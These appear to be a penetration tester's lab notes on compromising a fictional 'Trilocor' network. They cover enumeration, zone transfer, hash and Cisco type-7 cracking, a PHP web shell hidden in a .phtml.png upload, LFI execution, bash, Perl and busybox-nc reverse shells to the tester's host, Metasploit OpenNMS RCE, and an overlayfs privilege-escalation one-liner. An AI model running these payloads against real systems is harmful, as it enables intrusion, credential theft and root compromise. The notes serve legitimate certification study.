---
aliases:
---
---

![[Pasted image 20260120120213.png]]

![[Pasted image 20260120145448.png]]

![[Pasted image 20260120120356.png]]

```bash
nmap -sCV -p21,22,25,53,80,110,111,143,993,995 10.129.5.203 -oG ports_service_scan                                                              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 10:03 -0500
Nmap scan report for tricolor.local (10.129.5.203)
Host is up (0.43s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.63
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: WEB-DMZ01, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp  open  domain   (unknown banner: BIND 9)
| dns-nsid: 
|_  bind.version: BIND 9
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    BIND 9
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.3
|_http-title: Trilocor &#8211; A cutting edge robotics company!
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP SASL UIDL AUTH-RESP-CODE RESP-CODES CAPA STLS PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
111/tcp open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more Pre-login IMAP4rev1 LOGIN-REFERRALS ENABLE SASL-IR post-login LITERAL+ listed capabilities STARTTLS ID OK IDLE have LOGINDISABLEDA0001
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
|_imap-capabilities: Pre-login more LOGIN-REFERRALS ENABLE SASL-IR capabilities LITERAL+ post-login AUTH=PLAINA0001 IDLE ID OK listed have IMAP4rev1
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-10-13T17:49:27
|_Not valid after:  2032-10-10T17:49:27
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP USER UIDL AUTH-RESP-CODE RESP-CODES CAPA SASL(PLAIN) PIPELINING
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=1/20%Time=696F995F%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,33,"\x001\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x07\x06BIND\x209");
Service Info: Host:  WEB-DMZ01; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.54 seconds
```

![[Pasted image 20260120121024.png]]

```bash
dig axfr @10.129.5.203 trilocor.local

; <<>> DiG 9.20.15-2-Debian <<>> axfr @10.129.5.203 trilocor.local
; (1 server found)
;; global options: +cmd
trilocor.local.         86400   IN      SOA     ns1.trilocor.local. dnsadmin.trilocor.local. 21 604800 86400 2419200 86400
trilocor.local.         86400   IN      NS      trilocor.local.
trilocor.local.         86400   IN      A       127.0.0.1
blog.trilocor.local.    86400   IN      A       127.0.0.1
dev.trilocor.local.     86400   IN      A       127.0.0.1
jobs.trilocor.local.    86400   IN      A       127.0.0.1
news.trilocor.local.    86400   IN      A       127.0.0.1
nms.trilocor.local.     86400   IN      A       127.0.0.1
selfservicestg.trilocor.local. 86400 IN A       127.0.0.1
shop.trilocor.local.    86400   IN      A       127.0.0.1
trilocor.local.         86400   IN      SOA     ns1.trilocor.local. dnsadmin.trilocor.local. 21 604800 86400 2419200 86400
;; Query time: 383 msec
;; SERVER: 10.129.5.203#53(10.129.5.203) (TCP)
;; WHEN: Tue Jan 20 10:17:18 EST 2026
;; XFR size: 11 records (messages 1, bytes 341)
```

![[Pasted image 20260120121819.png]]

## news.trilocor.local

![[Pasted image 20260120121843.png]]

```bash
gobuster vhost -u http://trilocor.local -w /usr/share/seclists/Discovery/DNS/bitquark-sub
news.trilocor.local Status: 200 [Size: 21033]
dev.trilocor.local Status: 200 [Size: 10918]
shop.trilocor.local Status: 200 [Size: 13057]
jobs.trilocor.local Status: 200 [Size: 3661]
blog.trilocor.local Status: 302 [Size: 314] [--> /core/install.php]
nms.trilocor.local Status: 302 [Size: 0] [--> http://nms.trilocor.local/opennms/]
jobs.trilocor.localnms.trilocor.localhrportal.trilocor.local Status: 200 [Size: 2423]
*.trilocor.local Status: 400 [Size: 301]
```

![[Pasted image 20260120122140.png]]

```bash
nmap -p 25 --script smtp-enum-users,smtp-open-relay,smtp-commands trilocor.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 11:28 -0500
Nmap scan report for trilocor.local (10.129.5.203)
Host is up (0.21s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  root
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
|_smtp-commands: WEB-DMZ01, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

Nmap done: 1 IP address (1 host up) scanned in 40.76 seconds
```
## hrportal.triilocor.local

![[Pasted image 20260120122509.png]]

## blog.trilocor.local

![[Pasted image 20260120123631.png]]

![[Pasted image 20260120134703.png]]


## nms.trilocor.local

![[Pasted image 20260120124213.png]]

`admin:admin`

![[Pasted image 20260120124311.png]]

![[Pasted image 20260120125026.png]]

![[Pasted image 20260120125214.png]]

![[Pasted image 20260120125200.png]]

![[Pasted image 20260120125933.png]]

![[Pasted image 20260120165338.png]]

![[Pasted image 20260120192147.png]]

![[Pasted image 20260120192414.png]]

![[Pasted image 20260120192833.png]]

```bash
nc -nlvp 3389                                              
listening on [any] 3389 ...
connect to [10.10.16.63] from (UNKNOWN) [10.129.5.203] 34651
```

![[Pasted image 20260120193700.png]]

![[Pasted image 20260120193535.png]]


## selfservicestg.trilocor.local

![[Pasted image 20260120130534.png]]

![[Pasted image 20260120130546.png]]

![[Pasted image 20260120143705.png]]

![[Pasted image 20260120143758.png]]


![[Pasted image 20260120143744.png]]

![[Pasted image 20260120144408.png]]


![[Pasted image 20260120144237.png]]

![[Pasted image 20260120145150.png]]

![[Pasted image 20260120145913.png]]

![[Pasted image 20260120150758.png]]

```bash
hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 5625/11251 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 10 digests; 10 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (8282 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

06e0f03a78f2d8b001d717a8a833801e:!@#$bri@nn@!@#$          
Approaching final keyspace - workload adjusted.
```

![[Pasted image 20260120151051.png]]

![[Pasted image 20260120155129.png]]

![[Pasted image 20260120161028.png]]

![[Pasted image 20260120195642.png]]

![[Pasted image 20260120195701.png]]

![[Pasted image 20260120203208.png]]

![[Pasted image 20260120203336.png]]

```bash
wget 10.10.16.63/index.html
/bin/sh: 19: wget: not found
which curl
/usr/bin/curl
curl http://10.10.16.63/index.html -o /tmp/index.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    61  100    61    0     0     78      0 --:--:-- --:--:-- --:--:--    78
ls
Jj
hsperfdata_opennms
hsperfdata_root
index.html
```


```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.216 - - [20/Jan/2026 18:34:40] "GET /index.html HTTP/1.1" 200 -
```

```bash
cat index.html
#!/bin/bash
bash -c "bash -i /dev/tcp/10.10.16.63/4444 0>&1"
mv index.html shell.sh; chmod +x shell.sh
```

```bash
which perl
/usr/bin/perl
perl -e 'use Socket;$i="10.10.16.63";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

```

```bash
nc -nlvp 4444    
listening on [any] 4444 ...
connect to [10.10.16.63] from (UNKNOWN) [10.129.5.216] 36686
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
opennms@fe16e33f0cfc:/usr/share/opennms$
```
```bash
java Shell
echo -e 'x\nx' | passwd
```

```bash
╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
DEBIAN_FRONTEND=noninteractive                                                                                                                                                              
HOME=/opt/opennms
HOSTNAME=fe16e33f0cfc
JAVA_HOME=/usr/lib/jvm/java
JAVA_OPTS=-Xmx1024m -XX:MaxMetaspaceSize=512m
LANG=C
OLDPWD=/var
OPENNMS_DBNAME=opennms
OPENNMS_DBPASS=opennms
OPENNMS_DBUSER=opennms
POSTGRES_HOST=database
POSTGRES_PASSWORD=postgres
POSTGRES_PORT=5432
POSTGRES_USER=postgres
PWD=/tmp
PWD=/usr/share/opennms
RUNAS=opennms
SHLVL=0
TZ=Europe/Berlin
USER=opennms
_=/tmp/Jj
_=/usr/bin/bash
_=/usr/bin/cat
_=/usr/bin/dd
_=/usr/bin/grep

```

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(linux/http/opennms_horizon_authenticated_rce) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(linux/http/opennms_horizon_authenticated_rce) > use 0
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run
```

```bash
msf post(multi/recon/local_exploit_suggester) > run
[*] 172.18.0.13 - Collecting local exploits for x64/linux...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 172.18.0.13 - 229 exploit checks are being tried...
[+] 172.18.0.13 - exploit/linux/local/apport_abrt_chroot_priv_esc: The service is running, but could not be validated. Could not determine Apport version. apport-cli is not installed or not in $PATH.
[+] 172.18.0.13 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 172.18.0.13 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 172.18.0.13 - exploit/linux/local/glibc_tunables_priv_esc: The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable
[*] 172.18.0.13 - Meterpreter session 1 closed.  Reason: Died
```

![[Pasted image 20260120213025.png]]

![[Pasted image 20260120213047.png]]

![[Pasted image 20260120213203.png]]

![[Pasted image 20260120213231.png]]

![[Pasted image 20260120213313.png]]

![[Pasted image 20260120213319.png]]

![[Pasted image 20260120213940.png]]

```bash
https://launchpad.net/ubuntu/noble/+package/cisco7crack
```

```bash
sudo dpkg -i cisco7crack_0.0~git20121221.f1c21dd-3_amd64.deb
Selecting previously unselected package cisco7crack.
(Reading database ... 543281 files and directories currently installed.)
Preparing to unpack cisco7crack_0.0~git20121221.f1c21dd-3_amd64.deb ...
Unpacking cisco7crack (0.0~git20121221.f1c21dd-3) ...
Setting up cisco7crack (0.0~git20121221.f1c21dd-3) ...
Processing triggers for kali-menu (2025.4.3) ...
Processing triggers for man-db (2.13.1-1) ..
```


```bash
cisco7crack 023557581E345C0048634837442426392C107A19       
Encrypted string : 023557581E345C0048634837442426392C107A19
Plain string     : S3cuR3AdM!N!STR@t0R
```

```bash
cisco7crack 08014249001C254641585B                   
Encrypted string : 08014249001C254641585B
Plain string     : @ngie@1337
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 022C2455582B2F2F      
Encrypted string : 022C2455582B2F2F
Plain string     : J@n3M@n
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 082B45420539091E1801
Encrypted string : 082B45420539091E1801
Plain string     : jill@lijj
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 023F544E280701607F1D5A1456
Encrypted string : 023F544E280701607F1D5A1456
Plain string     : Y0uCan!S33m3
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 023557581E345C0048634837442426392C107A19 
Encrypted string : 023557581E345C0048634837442426392C107A19
Plain string     : S3cuR3AdM!N!STR@t0R
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 02345457074701                          
Encrypted string : 02345457074701
Plain string     : R0ll!n
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cisco7crack 08116C5A0C15              
Encrypted string : 08116C5A0C15
Plain string     : P@tel
```

![[Pasted image 20260120231321.png]]


![[Pasted image 20260120231205.png]]
## prototype-beta.trilocor.local

![[Pasted image 20260120231423.png]]

![[Pasted image 20260120231447.png]]

![[Pasted image 20260120231559.png]]

![[Pasted image 20260120232943.png]]

```bash
gobuster dir -u http://prototype-beta.trilocor.local/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -x php -t 200 -q
upload.php           (Status: 200) [Size: 37]
index.php            (Status: 200) [Size: 2629]
images               (Status: 301) [Size: 347] [--> http://prototype-beta.trilocor.local/images/]
apply.php            (Status: 302) [Size: 345] [--> index.php?page=apply.php]
server-status        (Status: 403) [Size: 294]
^C

```


![[Pasted image 20260120233525.png]]

![[Pasted image 20260120234016.png]]

![[Pasted image 20260121000838.png]]

![[Pasted image 20260121002347.png]]

```php
echo "PD9waHAKCi8vIHJlZGlyZWN0IG9uIGRpcmVjdCBhY2Nlc3MKaWYgKF9fRklMRV9fID09PSByZWFscGF0aCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pKSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiBpbmRleC5waHA/cGFnZT1hcHBseS5waHAnKTsKfQoKc2Vzc2lvbl9zdGFydCgpOwoKJGNvZGVfZm9ybSA9ICcKPGNlbnRlcj4KPGgxPlBsZWFzZSBlbnRlciB5b3VyIGludml0ZSBjb2RlPC9oMT48YnI+CiAgICA8Zm9ybSBzdHlsZT0id2lkdGg6IDUwJSI+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvZGUiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIGlkPSJpbnZpdGUtY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgY29kZSI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGFnZSIgdmFsdWU9ImFwcGx5LnBocCIgLz4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U3VibWl0PC9idXR0b24+CiAgICA8L2Zvcm0+CjwvY2VudGVyPgonOwoKJHN1Ym1pc3Npb25fZm9ybSA9ICcKPGNlbnRlcj4KPGgxPlBsZWFzZSBlbnRlciB5b3VyIGRldGFpbHM8L2gxPjxicj4KICAgIDxmb3JtIHN0eWxlPSJ3aWR0aDogNTAlIiBpZD0ic3VibWlzc2lvbkZvcm0iPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iaW5wdXQtbmFtZSIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgZnVsbCBuYW1lIiBmb3JtPSJzdWJtaXNzaW9uRm9ybSIgcmVxdWlyZWQ+CiAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0iaW5wdXQtZW1haWwiIHBsYWNlaG9sZGVyPSJFbnRlciB5b3VyIGVtYWlsIiBmb3JtPSJzdWJtaXNzaW9uRm9ybSIgcmVxdWlyZWQ+CiAgICAgICAgPGZvcm0gYWN0aW9uPSJ1cGxvYWQucGhwIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGlkPSJ1cGxvYWRGb3JtIj4KICAgICAgICAgICAgPHA+UGxlYXNlIGNsaWNrIG9uIHRoZSBpbWFnZSBiZWxvdyB0byB1cGxvYWQgYW4gaW1hZ2Ugb2YgeW91ciBzdWJtaXNzaW9uPC9wPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkRmlsZSIgaWQ9InVwbG9hZEZpbGUiIG9uY2hhbmdlPSJjaGVja0ZpbGUodGhpcykiIGFjY2VwdD0iLmpwZywuanBlZywucG5nLC5naWYiIGZvcm09InVwbG9hZEZvcm0iPgogICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlcy9kZWZhdWx0LmpwZyIgY2xhc3M9InVwbG9hZC1pbWFnZSIgaWQ9InVwbG9hZC1pbWFnZSIgZm9ybT0idXBsb2FkRm9ybSI+CiAgICAgICAgICAgIDxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIiBpZD0ic3VibWl0LXVwbG9hZCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgZm9ybT0idXBsb2FkRm9ybSIgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IGdyZWVuOyBib3JkZXItY29sb3I6IGdyZWVuOyI+CiAgICAgICAgICAgIDxwIGlkPSJlcnJvcl9tZXNzYWdlIj48L3A+CiAgICAgICAgPC9mb3JtPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhZ2UiIHZhbHVlPSJhcHBseS5waHAiIGZvcm09InN1Ym1pc3Npb25Gb3JtIi8+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iMSIgZm9ybT0ic3VibWlzc2lvbkZvcm0iLz4KICAgICAgICA8YnI+PGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGlkPSJzdWJtaXQtZm9ybSIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgZm9ybT0ic3VibWlzc2lvbkZvcm0iIGRpc2FibGVkPlNlbmQgWW91ciBTdWJtaXNzaW9uPC9idXR0b24+CiAgICA8L2Zvcm0+CjwvY2VudGVyPgonOwoKaWYgKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZCJdKSB8fCAkX1NFU1NJT05bImxvZ2dlZCJdICE9PSB0cnVlKSB7CiAgICBpZiAoIWlzc2V0KCRfR0VUWyJjb2RlIl0pKSB7CiAgICAgICAgZWNobyAkY29kZV9mb3JtOwogICAgfQogICAgLy8gdmFsaWRhdGUgaW52aXRlIGNvZGUKICAgIGVsc2UgaWYgKGlzc2V0KCRfR0VUWydjb2RlJ10pICYmIHByZWdfbWF0Y2goJy9edHJpbF9bMC05QS1aYS16XXs0fV9bMC05QS1aYS16XXs0fV9bMC05QS1aYS16XXs0fV8yMFswLTldezJ9JC9pJywgJF9HRVRbJ2NvZGUnXSkpIHsKICAgICAgICAkX1NFU1NJT05bImxvZ2dlZCJdID0gdHJ1ZTsKICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiBhcHBseS5waHAnKTsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAkY29kZV9mb3JtOwogICAgICAgIGVjaG8gJzxjZW50ZXI+PHAgc3R5bGU9ImNvbG9yOiByZWQiPkludmFsaWQgY29kZSE8L3A+PC9jZW50ZXI+JzsKICAgIH0KfSBlbHNlIHsKICAgIGlmIChpc3NldCgkX0dFVFsnc3VibWl0J10pKSB7CiAgICAgICAgZWNobyAnPGNlbnRlcj48cD5Zb3VyIHN1Ym1pc3Npb24gaGFzIGJlZW4gc3VibWl0dGVkIHN1Y2Nlc3NmdWxseSE8L3A+PC9jZW50ZXI+JzsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAkc3VibWlzc2lvbl9mb3JtOwogICAgfQp9" | base64 -d
<?php

// redirect on direct access
if (__FILE__ === realpath($_SERVER['SCRIPT_FILENAME'])) {
    header('Location: index.php?page=apply.php');
}

session_start();

$code_form = '
<center>
<h1>Please enter your invite code</h1><br>
    <form style="width: 50%">
        <input type="text" name="code" class="form-control" id="invite-code" placeholder="Enter your code">
        <input type="hidden" name="page" value="apply.php" />
        <button type="submit" class="btn btn-primary">Submit</button>
    </form>
</center>
';

$submission_form = '
<center>
<h1>Please enter your details</h1><br>
    <form style="width: 50%" id="submissionForm">
        <input type="text" class="form-control" id="input-name" placeholder="Enter your full name" form="submissionForm" required>
        <input type="email" class="form-control" id="input-email" placeholder="Enter your email" form="submissionForm" required>
        <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
            <p>Please click on the image below to upload an image of your submission</p>
            <input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png,.gif" form="uploadForm">
            <img src="/images/default.jpg" class="upload-image" id="upload-image" form="uploadForm">
            <br><input type="submit" value="Upload" id="submit-upload" class="btn btn-primary" form="uploadForm" style="background-color: green; border-color: green;">
            <p id="error_message"></p>
        </form>
        <input type="hidden" name="page" value="apply.php" form="submissionForm"/>
        <input type="hidden" name="submit" value="1" form="submissionForm"/>
        <br><button type="submit" id="submit-form" class="btn btn-primary" form="submissionForm" disabled>Send Your Submission</button>
    </form>
</center>
';

if (!isset($_SESSION["logged"]) || $_SESSION["logged"] !== true) {
    if (!isset($_GET["code"])) {
        echo $code_form;
    }
    // validate invite code
    else if (isset($_GET['code']) && preg_match('/^tril_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_[0-9A-Za-z]{4}_20[0-9]{2}$/i', $_GET['code'])) {
        $_SESSION["logged"] = true;
        header('Location: apply.php');
    } else {
        echo $code_form;
        echo '<center><p style="color: red">Invalid code!</p></center>';
    }
} else {
    if (isset($_GET['submit'])) {
        echo '<center><p>Your submission has been submitted successfully!</p></center>';
    } else {
        echo $submission_form;
    }
}
```

![[Pasted image 20260121001905.png]]

![[Pasted image 20260121002006.png]]

```bash
cat exploit.phtml.png 
<?php system($_GET['cmd']); ?>
```

![[Pasted image 20260121030014.png]]

```bash
http://prototype-beta.trilocor.local/index.php?page=./user_submissions/exploit.phtml.png&cmd=busybox%20nc%2010.10.16.63%204444%20-e%20%2Fbin%2Fbash
```

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.63] from (UNKNOWN) [10.129.5.216] 44346
whoami
websvc
```

```bash
websvc@WEB-DMZ01:/home/websvc$ cat flag.txt
cat flag.txt
b7098545f2d1bd68ece2b175919f86d0
```

![[Pasted image 20260121030350.png]]

```bash
websvc@WEB-DMZ01:/home/websvc$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lab_adm:x:1000:1000:lab_adm:/home/lab_adm:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
websvc:x:1001:1001::/home/websvc:/bin/sh
srvadm:x:1002:1002::/home/srvadm:/bin/sh
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
bind:x:115:121::/var/cache/bind:/usr/sbin/nologin
dovecot:x:116:122:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:117:123:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
postfix:x:118:124::/var/spool/postfix:/usr/sbin/nologin
_rpc:x:119:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:120:65534::/var/lib/nfs:/usr/sbin/nologin
```

```BASH
websvc@WEB-DMZ01:/home/websvc$ cat /etc/passwd | grep ".*sh"
cat /etc/passwd | grep ".*sh"
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
lab_adm:x:1000:1000:lab_adm:/home/lab_adm:/bin/bash
websvc:x:1001:1001::/home/websvc:/bin/sh
srvadm:x:1002:1002::/home/srvadm:/bin/sh
```

```bash
websvc@WEB-DMZ01:/$ hostname -I
hostname -I
10.129.5.216 172.16.139.10 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb0:bfa
```

```bash
websvc@WEB-DMZ01:/tmp/m$ unshare -rm sh -c "mkdir -p l u w m && cp /usr/bin/python3 l/ && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && cp /bin/bash m/bash_root && chmod u+s m/bash_root && ./m/bash_root -p"
